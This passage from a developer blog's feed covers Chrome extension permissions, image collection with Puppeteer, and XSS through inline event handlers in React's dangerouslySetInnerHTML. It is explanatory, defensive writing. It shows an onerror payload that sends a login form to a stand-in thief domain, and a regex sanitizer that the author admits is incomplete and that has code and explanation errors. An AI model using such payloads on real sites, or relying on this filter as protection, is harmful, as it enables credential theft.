&lt;/p&gt;&lt;h2&gt;The Initial Structural Problem&lt;/h2&gt;&lt;p&gt;This warning was triggered by the first version of my &lt;code&gt;manifest.json&lt;/code&gt; file – specifically my usage of &lt;code&gt;content_scripts&lt;/code&gt;: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/11/image-8.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;509&quot; height=&quot;177&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Here&apos;s how it looked:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;{
    &quot;manifest_version&quot;: 3,
    &quot;name&quot;: &quot;PicPerf&apos;s Image Saver&quot;,
    &quot;version&quot;: &quot;1.1&quot;,
    &quot;description&quot;: &quot;Convert and save images in different formats.&quot;,
    &quot;permissions&quot;: [&quot;contextMenus&quot;, &quot;downloads&quot;],
    &quot;background&quot;: {
        &quot;service_worker&quot;: &quot;background.js&quot;
    },
    &quot;content_scripts&quot;: [
        {
            &quot;matches&quot;: [&quot;&amp;lt;all_urls&amp;gt;&quot;],
            &quot;js&quot;: [&quot;content.js&quot;]
        }
    ], 
    &quot;icons&quot;: {
        &quot;16&quot;: &quot;images/icon-16.png&quot;,
        &quot;48&quot;: &quot;images/icon-48.png&quot;,
        &quot;128&quot;: &quot;images/icon-128.png&quot;
    },  
    &quot;action&quot;: {}
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;content_scripts&lt;/code&gt; section of the file specifies code that can &lt;a href=&quot;https://developer.chrome.com/docs/extensions/develop/concepts/content-scripts?ref=cms.macarthur.me&quot;&gt;run in the context of a loaded web page&lt;/a&gt;. Any scripts injected here can read, modify, and share details about what the user&apos;s viewing. That sounds inherently risky, and for good reason. And even risker, the &lt;code&gt;&amp;lt;all_urls&amp;gt;&lt;/code&gt; match meant &lt;code&gt;content.js&lt;/code&gt; would be able to run on &lt;em&gt;any &lt;/em&gt;page. No restrictions.&lt;/p&gt;&lt;p&gt;My extension does legitimately need to access this kind of stuff. It&apos;d performs a little bit of DOM work to indicate a conversion is being performed, and it&apos;s also necessary for triggering a download when the work is finished. (There may be a way to offload some of this work to that &lt;code&gt;background.js&lt;/code&gt; file referenced above, but I haven&apos;t done deep exploration into those possibilities yet). &lt;/p&gt;&lt;p&gt;All of this &lt;code&gt;content.js&lt;/code&gt; work was triggered by an event published from my &lt;code&gt;background.js&lt;/code&gt; file:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;chrome.contextMenus.onClicked.addListener((info, tab) =&amp;gt; {
  const formatId = info.menuItemId.replace(&quot;convert-to-&quot;, &quot;&quot;);
  const format = FORMATS.find((f) =&amp;gt; f.id === formatId);

  chrome.tabs.sendMessage(tab.id, {
    type: &quot;CONVERT_IMAGE&quot;,
    imageUrl: info.srcUrl,
    format: format,
  });
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;All of this was functioning fine, so I was eager to figure out a workaround.&lt;/p&gt;&lt;h2&gt;Granting Access On-Demand&lt;/h2&gt;&lt;p&gt;Thankfully, it didn&apos;t take long. I was able to find an alternative approach using Chrome&apos;s &lt;a href=&quot;https://developer.chrome.com/docs/extensions/develop/concepts/activeTab?ref=cms.macarthur.me&quot;&gt;&quot;activeTab&quot; and &quot;scripting&quot; permissions&lt;/a&gt;, which would grant access to the page &lt;em&gt;only when the extension is explicitly invoked. &lt;/em&gt;This way, all the work I needed to do would only ever happen in response to a user&apos;s action, and only on the current tab. It&apos;s a bit safer, and it&apos;d mean I could bypass that extra review time.&lt;/p&gt;&lt;p&gt;First up, I added a couple more permissions and removed the &lt;code&gt;content_scripts&lt;/code&gt; property from my &lt;code&gt;manifest.json&lt;/code&gt; file. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;{
    &quot;manifest_version&quot;: 3,
    &quot;name&quot;: &quot;PicPerf&apos;s Image Saver&quot;,
    &quot;version&quot;: &quot;1.1&quot;,
    &quot;description&quot;: &quot;Convert and save images in different formats.&quot;,
-    &quot;permissions&quot;: [&quot;contextMenus&quot;, &quot;downloads&quot;],
+    &quot;permissions&quot;: [&quot;contextMenus&quot;, &quot;downloads&quot;, &quot;activeTab&quot;, &quot;scripting&quot;],
    &quot;background&quot;: {
        &quot;service_worker&quot;: &quot;background.js&quot;
    },
-    &quot;content_scripts&quot;: [
-        {
-            &quot;matches&quot;: [&quot;&amp;lt;all_urls&amp;gt;&quot;],
-            &quot;js&quot;: [&quot;content.js&quot;]
-        }
-    ], 
    &quot;icons&quot;: {
        &quot;16&quot;: &quot;images/icon-16.png&quot;,
        &quot;48&quot;: &quot;images/icon-48.png&quot;,
        &quot;128&quot;: &quot;images/icon-128.png&quot;
    },  
    &quot;action&quot;: {}
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Next, I adjusted that &lt;code&gt;background.js&lt;/code&gt; bit to use Chrome&apos;s &lt;a href=&quot;https://developer.chrome.com/docs/extensions/reference/api/scripting?ref=cms.macarthur.me&quot;&gt;Scripting API&lt;/a&gt;. Rather than strictly publishing a message to a content script that&apos;s already listening, it&apos;d first &lt;em&gt;execute&lt;/em&gt; that script, and &lt;em&gt;then&lt;/em&gt; publish the message.&lt;br /&gt;&lt;br /&gt;It&apos;s a bit contrived for ease of explanation, but this is how it unfolded:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;// background.js

chrome.contextMenus.onClicked.addListener((info, tab) =&amp;gt; {
  const formatId = info.menuItemId.replace(&quot;convert-to-&quot;, &quot;&quot;);
  const format = FORMATS.find((f) =&amp;gt; f.id === formatId);

  // First, execute the client-side script.
  chrome.scripting
    .executeScript({
      target: { tabId: tab.id },
      files: [&quot;content.js&quot;],
    })
    .then(() =&amp;gt; {
      // Then, publish the message like before.
      chrome.tabs.sendMessage(tab.id, {
        type: &quot;CONVERT_IMAGE&quot;,
        imageUrl: info.srcUrl,
        format: format,
      });
    },
    (error) =&amp;gt; {
      console.error(error);
    }
  );
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;At first attempted, everything continued to work fine. Until I started to repeatedly save images on the same page.&lt;/p&gt;&lt;h3&gt;Avoiding Repeat Execution&lt;/h3&gt;&lt;p&gt;With this setup, &lt;code&gt;content.js&lt;/code&gt; was executing &lt;em&gt;every time&lt;/em&gt; my context menu item was clicked. That meant my event listener would become repeatedly reregistered, causing more callbacks to trigger unnecessarily. &lt;/p&gt;&lt;p&gt;For my needs, the fix was simple enough: only execute the script when I know it hadn&apos;t been done before. Otherwise, publish that message like normal. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;// background.js

globalThis._PP_EXECUTED_ON_TABS = new Set();

function publishMessage(tabId, srcUrl, format) {
  chrome.tabs.sendMessage(tabId, {
    type: &quot;CONVERT_IMAGE&quot;,
    imageUrl: srcUrl,
    format: format,
  });
}

chrome.contextMenus.onClicked.addListener((info, tab) =&amp;gt; {
  const formatId = info.menuItemId.replace(&quot;convert-to-&quot;, &quot;&quot;);
  const format = FORMATS.find((f) =&amp;gt; f.id === formatId);

  // It&apos;s already been executed on this tab! Bow out early.
  if (globalThis._PP_EXECUTED_ON_TABS.has(tab.id)) {
    publishMessage(tab.id, info.srcUrl, format);

    return;
  }

  globalThis._PP_EXECUTED_ON_TABS.add(tab.id);

  chrome.scripting
    .executeScript({
      target: { tabId: tab.id },
      files: [&quot;content.js&quot;],
    })
    .then(() =&amp;gt; {
      publishMessage(tab.id, info.srcUrl, format);
    },
    (error) =&amp;gt; {
      console.error(error);
    }
  );
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;No change to my &lt;code&gt;content.js&lt;/code&gt; file was needed at all, by the way. It just listened for an event from Chrome like before: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;// content.js

chrome.runtime.onMessage.addListener((message) =&amp;gt; {
  if (message.type === &quot;CONVERT_IMAGE&quot;) {
    // Do stuff.
  }
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Works great, and all parties (especially me) were satisfied. ✅&lt;/p&gt;&lt;h2&gt;I&apos;ll Be Back&lt;/h2&gt;&lt;p&gt;I am still so sorely unfamiliar with the extension writing process, as well as the APIs and conventions Chrome provides with it. So, while it&apos;s such a little thing, understanding how some of these pieces fit together was very satisfying. I&apos;m eager to iterate on this extension and be back to build more tools in the future.&lt;/p&gt;&lt;p&gt;The PicPerf Image Saver is live, by the way. &lt;a href=&quot;https://chromewebstore.google.com/detail/picperfs-image-saver/mkkhekgceoieddgneokfmijahkombhcg?ref=cms.macarthur.me&quot;&gt;Install it&lt;/a&gt; and send me your feedback!&lt;/p&gt;</content:encoded></item><item><title>Collect All Requested Images on a Website Using Puppeteer</title><link>https://macarthur.me/posts/collect-images-with-puppeteer</link><guid isPermaLink="true">https://macarthur.me/posts/collect-images-with-puppeteer</guid><pubDate>Thu, 14 Nov 2024 01:21:56 GMT</pubDate><content:encoded>&lt;p&gt;When I was building &lt;a href=&quot;https://picperf.io/analyze?ref=cms.macarthur.me&quot;&gt;PicPerf&apos;s page analyzer&lt;/a&gt;, I needed to figure out how to identify every image loaded on a particular page. It sounded like a simple task – scrape the HTML for &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; tags, pull off the &lt;code&gt;src&lt;/code&gt; attributes, and profit. I&apos;m using Puppeteer, so I started stubbing out something like this:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const browser = await puppeteer.launch(launchArgs);
const page = await browser.newPage();

await page.goto(url, { waitUntil: &quot;networkidle2&quot; });

const images = await page.evaluate(() =&amp;gt; {
  return Array.from(document.getElementsByTagName(&quot;img&quot;)).map(
    (img) =&amp;gt; img.src,
  );
});

// Do something w/ an array of URLs...&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I didn&apos;t take long to realize how insufficient that would be.&lt;/p&gt;&lt;p&gt;First, &lt;strong&gt;not every image is loaded via &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; tag.&lt;/strong&gt; If I didn&apos;t want to miss anything, I&apos;d also need to parse the contents of CSS files, &lt;code&gt;&amp;lt;style&amp;gt;&lt;/code&gt; tags, and &lt;code&gt;style&lt;/code&gt; attributes. &lt;/p&gt;&lt;p&gt;I started going down this path and it was not pretty. You can&apos;t just pluck a &lt;code&gt;src&lt;/code&gt; attribute off a blob of CSS. You gotta be willing to make shameful choices, like writing a regular expression to pull URLs out of chunks of markup: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const images = await page.evaluate(() =&amp;gt; {
  function extractImagesFromMarkup(markup) {
    return (
      markup?.match(
        /(?:https?:\/)?\/[^ ,]+\.(jpg|jpeg|png|gif|webp|avif)(?:\?[^ &quot;&apos;)]*)?/gi,
      ) || []
    );
  }

  return {
    imageTags: Array.from(document.querySelectorAll(&quot;img&quot;))
      .map((el) =&amp;gt; {
        return extractImagesFromMarkup(el.getAttribute(&quot;src&quot;));
      })
      .flat(),

    styleAttributes: Array.from(document.querySelectorAll(&quot;*&quot;))
      .map((el) =&amp;gt; {
        return extractImagesFromMarkup(el.getAttribute(&quot;style&quot;));
      })
      .flat(),

    styleTags: Array.from(document.querySelectorAll(&quot;style&quot;))
      .map((el) =&amp;gt; {
        return extractImagesFromMarkup(el.innerHTML);
      })
      .flat(),
  };
});

const { imageTags, styleAttributes, styleTags } = images;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I&apos;m sorry you had to see that. And it doesn&apos;t even cover every case (like &lt;code&gt;&amp;lt;picture&amp;gt;&lt;/code&gt; elements or &lt;code&gt;.css&lt;/code&gt; file contents). I was bound to miss something. &lt;/p&gt;&lt;p&gt;Second, even if I could reliably find every image in the code, &lt;strong&gt;it doesn&apos;t mean every one would be downloaded and rendered on page load&lt;/strong&gt;. Any given website could have a mound of CSS media queries that load images only on certain screen sizes, or responsive images that leave it up to the browser: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;img 
  src=&quot;ur-mom-2000px.jpg&quot; 
  srcset=&quot;ur-mom-600px.jpg 600w, ur-mom-2000px.jpg 2000w&quot; 
  sizes=&quot;(max-width: 600px) 100vw, 2000px&quot; 
  alt=&quot;Your Mother&quot;
&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If I wanted this page analyzer to be reasonably accurate, I needed &lt;em&gt;only&lt;/em&gt; the images a real user would need to wait to be downloaded when a real browser was fired up, and I wasn&apos;t interested in trading my soul to write an even more clever chunk of code to pull it off. &lt;/p&gt;&lt;h2&gt;Don&apos;t Scrape. &lt;em&gt;Listen for Requested Images&lt;/em&gt;&lt;/h2&gt;&lt;p&gt;I eventually realized I&apos;m not limited to scraping a bunch of cold, hard HTML when using a tool like Puppeteer. I could set up a listener to capture images that were &lt;em&gt;actually&lt;/em&gt; downloaded during a browser session. &lt;/p&gt;&lt;p&gt;That&apos;s easy enough to set up. First, Puppeteer&apos;s request interception feature needed to be enabled when the page was created: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const browser = await puppeteer.launch(launchArgs);
const page = await browser.newPage();

// Enable requests to be intercepted.
await page.setRequestInterception(true);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then, the request handler could be built out like so:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;// Will collect image URLs in here.
const imageUrls = [];

page.on(&quot;request&quot;, (req) =&amp;gt; {
  if (req.isInterceptResolutionHandled()) return;

  // Do stuff here. 

  return req.continue();
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That first line calling &lt;code&gt;isInterceptResolutionHandled()&lt;/code&gt; is important – I used it to bow out early if the incoming request has already been handled &lt;a href=&quot;https://pptr.dev/api/puppeteer.httprequest.isinterceptresolutionhandled?ref=cms.macarthur.me&quot;&gt;by a &lt;em&gt;different&lt;/em&gt; event listener&lt;/a&gt;. (Technically, this isn&apos;t critical if you &lt;em&gt;know&lt;/em&gt; you&apos;re the only one listening, but good practice nonetheless.). Between that and &lt;code&gt;req.continue()&lt;/code&gt;, I could start collecting images. &lt;/p&gt;&lt;h3&gt;Filtering Out the Junk&lt;/h3&gt;&lt;p&gt;I just wanted image requests, but as I filtered, I set things up to &lt;code&gt;abort()&lt;/code&gt; requests through domains that didn&apos;t impact to how the page was rendered (it&apos;d same on some analysis time too). For the most part, that meant hefty analytics requests: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const DOMAIN_BLACKLIST = [
  &quot;play.google.com&quot;,
  &quot;ad-delivery.net&quot;,
  &quot;youtube.com&quot;,
  &quot;track.hubspot.com&quot;,
  &quot;googleapis.com&quot;,
  &quot;doubleclick.net&quot;,
  // Many, many more...
];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then, it was a matter of aborting the request when its hostname was found in the list:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;page.on(&quot;request&quot;, (req) =&amp;gt; {
  if (req.isInterceptResolutionHandled()) return;

  const urlObj = new URL(req.url());

  // Block requests.
  if (DOMAIN_BLACKLIST.includes(urlObj.hostname)) {
    return req.abort();
  }

  return req.continue();
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With that out of the way, I could focus on collecting images into that &lt;code&gt;imageUrls&lt;/code&gt; variable, but only if they were in my list of permitted extensions. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const imageExtensions = [
  &quot;jpg&quot;,
  &quot;jpeg&quot;,
  &quot;png&quot;,
  &quot;gif&quot;,
  &quot;webp&quot;,
  &quot;avif&quot;,
  &quot;svg&quot;,
];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I also left out any &lt;code&gt;data:&lt;/code&gt; sources, since I wanted only fully qualified image URLs. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;page.on(&quot;request&quot;, (req) =&amp;gt; {
  if (req.isInterceptResolutionHandled()) return;

  const urlObj = new URL(req.url());

  if (DOMAIN_BLACKLIST.includes(urlObj.hostname)) {
    return req.abort();
  }

  const fileExtension = urlObj.pathname.split(&quot;.&quot;).pop();

  if (
    req.resourceType() === &quot;image&quot; &amp;amp;&amp;amp;
    
    // Must be a permitted extension.
    imageExtensions.includes(fileExtension) &amp;amp;&amp;amp;
    
    // No data sources.
    !req.url().includes(&quot;data:&quot;)
  ) {
    imageUrls.push(req.url());
  }

  return req.continue();
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That&apos;s a much more reliable approach than scraping. But there was still more to be done to collect every image that could possibly be loaded.&lt;/p&gt;&lt;h2&gt;Accounting for Scrolling&lt;/h2&gt;&lt;p&gt;First up, I wanted to make sure I collected any image that was loaded throughout the full length of the page. But due to possible lazy loading (native or not), I wanted to trigger a full page scroll to catch them all. So, I used this little function that scrolled by 100px every 100ms: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;  async function autoScroll(page: Page) {
    await page.evaluate(async () =&amp;gt; {
      return await new Promise&amp;lt;void&amp;gt;((resolve) =&amp;gt; {
        let totalHeight = 0;

        const distance = 100;
        const timer = setInterval(() =&amp;gt; {
          window.scrollBy(0, distance);
          totalHeight += distance;

          if (
            totalHeight &amp;gt;=
            document.body.scrollHeight - window.innerHeight
          ) {
            clearInterval(timer);
            resolve();
          }
        }, 100);
    });
  });
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I then used that to keep the page open until the full page had been scrolled:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const browser = await puppeteer.launch(launchArgs);
const page = await browser.newPage();

// Other page setup stuff...

await page.goto(url, { waitUntil: &quot;networkidle2&quot; });

// page.on(&quot;request&quot;) handler here.

await this.autoScroll(page);
await browser.close();&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That accounted for lazily loaded images, but before this was considered &quot;ready,&quot; I needed to tidy up a couple more things.&lt;/p&gt;&lt;h3&gt;Viewport &amp;amp; User Agent&lt;/h3&gt;&lt;p&gt;For this to resemble a real-life device as much as reasonably possible, it made sense to go with a popular mobile phone size for the viewport. I choose the following: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const browser = await puppeteer.launch(launchArgs);
const page = await browser.newPage();

// Other page setup stuff...

page.setViewport({ width: 430, height: 932 });&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And finally, I used my own user agent for the page as well: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;page.setUserAgent(
  &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36&quot;,
);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With that, I was set up for success. &lt;/p&gt;&lt;h2&gt;That&apos;ll Do&lt;/h2&gt;&lt;p&gt;I wrapped this tool up with a strong feeling of appreciation for headless browsing tools like Puppeteer and Playwright. There&apos;s a lot of complexity wrapped into an API making it easy to programmatically use a browser like a human would. Cheers to the smart people building that stuff. &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://picperf.io/analyze?ref=cms.macarthur.me&quot;&gt;Try out the tool for yourself&lt;/a&gt;, by the way! At the very least, it&apos;ll help catch other quirks I&apos;ve overlooked until now.&lt;/p&gt;</content:encoded></item><item><title>TIL: inline event handlers still fire when passed to React&apos;s dangerouslySetInnerHTML</title><link>https://macarthur.me/posts/safer-dangerouslysetinnerhtml</link><guid isPermaLink="true">https://macarthur.me/posts/safer-dangerouslysetinnerhtml</guid><pubDate>Sat, 09 Nov 2024 19:44:11 GMT</pubDate><content:encoded>&lt;p&gt;Last year, &lt;a href=&quot;https://macarthur.me/posts/script-tags-in-react?ref=cms.macarthur.me&quot;&gt;I wrote a post&lt;/a&gt; about how to execute &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tags with React&apos;s &lt;code&gt;dangerouslySetInnerHTML&lt;/code&gt; prop. Like this:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const App = () =&amp;gt; {
  return (
    &amp;lt;div dangerouslySetInnerHTML={{ __html: `
      &amp;lt;script&amp;gt;console.log(&quot;taxation is theft&quot;);&amp;lt;/script&amp;gt;
    `}}&amp;gt;&amp;lt;/div&amp;gt;
  );
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;By default, &lt;code&gt;dangerouslySetInnerHTML&lt;/code&gt; will not allow those scripts to execute because it relies on JavaScript&apos;s &lt;code&gt;innerHTML&lt;/code&gt;, &lt;a href=&quot;https://www.w3.org/TR/2008/WD-html5-20080610/dom.html?ref=cms.macarthur.me#innerhtml0&quot;&gt;which prohibits it&lt;/a&gt;. Knowing that, I&apos;ve always kind of assumed that the &quot;danger&quot; in injecting content like this was a little overblown. That was stupid, and I was made aware of this stupidity by seeing &lt;a href=&quot;https://x.com/matveydev/status/1847660510247821349?ref=cms.macarthur.me&quot;&gt;this from @matveydev&lt;/a&gt;: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/11/image.png&quot; alt=&quot;tweet screenshot revealing it&apos;s possible to execute scripts inside the dangerouslySetInnerHTML prop&quot; loading=&quot;lazy&quot; width=&quot;1156&quot; height=&quot;404&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;em&gt;Of course&lt;/em&gt; a script tag isn&apos;t the only way to execute JavaScript. HTML&apos;s large set of inline event handlers is just another tactic. But this one&lt;em&gt; won&apos;t be blocked&lt;/em&gt; when injected with &lt;code&gt;.innerHTML&lt;/code&gt;. Things like this, for instance, will run just fine:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const App = () =&amp;gt; {
  return (
    &amp;lt;div dangerouslySetInnerHTML={{ __html: `
      &amp;lt;button onclick=&quot;console.log(&apos;Watch out, sucker!&apos;)&quot;&amp;gt;
    `}}&amp;gt;&amp;lt;/div&amp;gt;
  );
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That means you could do something more nefarious, like what @matveydev shared, or a variety of other things, like changing where a form submits information:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const App = () =&amp;gt; {
  return (
    &amp;lt;div dangerouslySetInnerHTML={{ __html: `
      &amp;lt;img src=&quot;x&quot; onerror=&quot;document.getElementById(&apos;loginForm&apos;).action = &apos;https://bad-place-that-will-steal-your-info.com&apos;&quot;&amp;gt;
    `}}&amp;gt;&amp;lt;/div&amp;gt;
  );
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This appears to be possible with &lt;em&gt;any&lt;/em&gt; inline event handler. I guess &lt;code&gt;dangerouslySetInnerHTML&lt;/code&gt; really is named appropriately.&lt;/p&gt;&lt;h2&gt;Preventing Inline Event Handler Executions&lt;/h2&gt;&lt;p&gt;If you&apos;re gonna make &lt;code&gt;dangerouslySetInnerHTML&lt;/code&gt; &lt;em&gt;fully&lt;/em&gt; safe, use a good HTML sanitization library or &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP?ref=cms.macarthur.me&quot;&gt;Content Security Policy&lt;/a&gt;. But we&apos;re gonna explore taking care of this specific vulnerability ourselves anyway. For fun.&lt;/p&gt;&lt;p&gt;Let&apos;s start putting together a &lt;code&gt;SafeElement&lt;/code&gt; component that accepts some markup: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;function SafeElement({ markup, ...props }) {
  return (
    &amp;lt;div 
      dangerouslySetInnerHTML={{ __html: markup }} {...props}&amp;gt;
    &amp;lt;/div&amp;gt;
  );
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now, let&apos;s write a function to sanitize that markup before it has a chance to execute anything naughty. To test it out, we&apos;ll use this simple string of HTML with a dash of badness baked in: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&quot;x&quot; onerror=&quot;console.log(&apos;communism&apos;)&quot;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;h3&gt;Using a DOMParser&lt;/h3&gt;&lt;p&gt;There are a couple options we could go with this. First, we could use a &lt;code&gt;DOMParser&lt;/code&gt;  instance to remove any &lt;code&gt;on*&lt;/code&gt; attributes from every HTML element: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;function sanitize(markup) {
  const doc = new DOMParser().parseFromString(markup, &apos;text/html&apos;);

  doc.querySelectorAll(&apos;*&apos;).forEach(node =&amp;gt; {
    Array.from(node.attributes).forEach(attr =&amp;gt; {
      if (attr.name.startsWith(&apos;on&apos;)) {
        node.removeAttribute(attr.name);
      }
    });
  });

  return doc.body.innerHTML;
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Running our contrived HTML through this would completely strip off the inline handlers: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&quot;x&quot;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The benefit of this approach is that you&apos;re using an HTML-focused API to manipulate HTML. It&apos;s straightforward and predictable to remove attributes with standard DOM methods. &lt;/p&gt;&lt;h3&gt;Using a Regular Expression + .replace()&lt;/h3&gt;&lt;p&gt;But it&apos;s also a decent chunk of code compared to an alternative: a good ol&apos; &lt;code&gt;.replace()&lt;/code&gt; stuffed with a regular expression:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function sanitize(markup) {
  return html.replace(/(?!\s+)(on[a-z]+\s*=\s*)/gi, &quot;nope=&quot;);
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Regular expressions are scary, but this one&apos;s relatively tame. Breaking it down, starting at the end: &lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;/gi&lt;/code&gt; tells the pattern to match against the entire string, as many times as necessary, and in a case-insensitive way. &lt;/li&gt;&lt;li&gt;&lt;code&gt;(on[a-z]+\s*=\s*)&lt;/code&gt; matches against any attribute starting with &quot;on&quot; and ending with any amount of letters, but only up until &quot;=&quot; (surrounded optionally by spaces. This should cover any event handler in an HTML tag. &lt;/li&gt;&lt;li&gt;&lt;code&gt;(?!\s+)&lt;/code&gt; matches against one or more spaces, but it&apos;s inside a non-capturing group (denoted by the &lt;code&gt;?!&lt;/code&gt;), which means it&apos;ll be ignored when we perform the string replacement. &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;You could beef this up to only match against attributes found within what you &lt;em&gt;know&lt;/em&gt; are HTML tags (there&apos;d be a lower chance of borking legitimate user-generated content), but this should cover 99.999999999% of cases. For us, the markup would end up like so, preventing it from executing (until browsers implement a &quot;nope&quot; event handler):&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&quot;x&quot; nope=&quot;console.log(&apos;communism&apos;)&quot;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;For less code, you get the same desired outcome. But there&apos;s another advantage too: It&apos;s &lt;em&gt;far&lt;/em&gt; more performant than using a &lt;code&gt;DOMParser&lt;/code&gt;. &lt;a href=&quot;https://jsbench.me/9lm3ae5ts7/2?ref=cms.macarthur.me&quot;&gt;A simple benchmark &lt;/a&gt;(which should always be interpreted with a grain of salt) shows that using a &lt;code&gt;DOMParser&lt;/code&gt; was ~99.45% slower than &lt;code&gt;.replace()&lt;/code&gt; with a pattern.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/11/image-6.png&quot; alt=&quot;RegExp vs DOMParser benchmark&quot; loading=&quot;lazy&quot; width=&quot;1620&quot; height=&quot;654&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Worth noting if your application is particularly performance-sensitive.&lt;/p&gt;&lt;h3&gt;Wiring It Up&lt;/h3&gt;&lt;p&gt;Largely because of the amount of fear it strikes in the hearts of engineers, I&apos;m opting for regular expression + &lt;code&gt;.replace()&lt;/code&gt; option. Here&apos;s full implementation of a &quot;safer&quot; way to use &lt;code&gt;dangerouslySetInnerHTML&lt;/code&gt;:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function sanitize(markup) {
  return markup.replace(/(?!\s+)(on[a-z]+=)/gi, &quot;nope=&quot;);
}

function SafeElement({ element = &apos;div&apos;, markup, ...props }) {
  const Element = element;
  const sanitizedMarkup = sanitize(markup);

  return (
    &amp;lt;Element 
      dangerouslySetInnerHTML={{ __html: sanitizedMarkup }} 
      {...props} 
    /&amp;gt;
  );
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Along with an example: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;function App () {
  return (
    &amp;lt;div&amp;gt;
      &amp;lt;SafeElement
        element=&quot;span&quot;
        markup={`
          static content.

          &amp;lt;script&amp;gt;console.log(&quot;regular console log&quot;);&amp;lt;/script&amp;gt;
          &amp;lt;img src=&quot;x&quot; onerror=&quot;console.log(&apos;on error from img&apos;)&quot;&amp;gt;
          &amp;lt;button onclick=&quot;console.log(&apos;do bad stuff&apos;)&quot;&amp;gt;Trust me!&amp;lt;/button&amp;gt;
      `}
      /&amp;gt;
    &amp;lt;/div&amp;gt;
  );
};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now, take a look at your console. You won&apos;t see much.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/11/image-4.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1520&quot; height=&quot;352&quot; /&gt;&lt;/figure&gt;&lt;p&gt;That means it worked, and we&apos;ve won.&lt;/p&gt;&lt;h2&gt;How bulletproof is this?&lt;/h2&gt;&lt;p&gt;Don&apos;t walk away from this thinking you can wield &lt;code&gt;dangerouslySetInnerHTML&lt;/code&gt; without shooting yourself in the foot ever again. We didn&apos;t discuss other very real vulnerabilities like the &lt;code&gt;javascript://&lt;/code&gt; &lt;a href=&quot;https://twitter.com/amacarthur/status/1855989032733356056?ref=cms.macarthur.me&quot;&gt;pseudo-protocol&lt;/a&gt;. That&apos;s why, again, it&apos;s in your best interest to at least consider using a comprehensive sanitization library in your production application. Some great ones are out there, including &lt;a href=&quot;https://github.com/cure53/DOMPurify?ref=cms.macarthur.me&quot;&gt;DOMPurify&lt;/a&gt; and 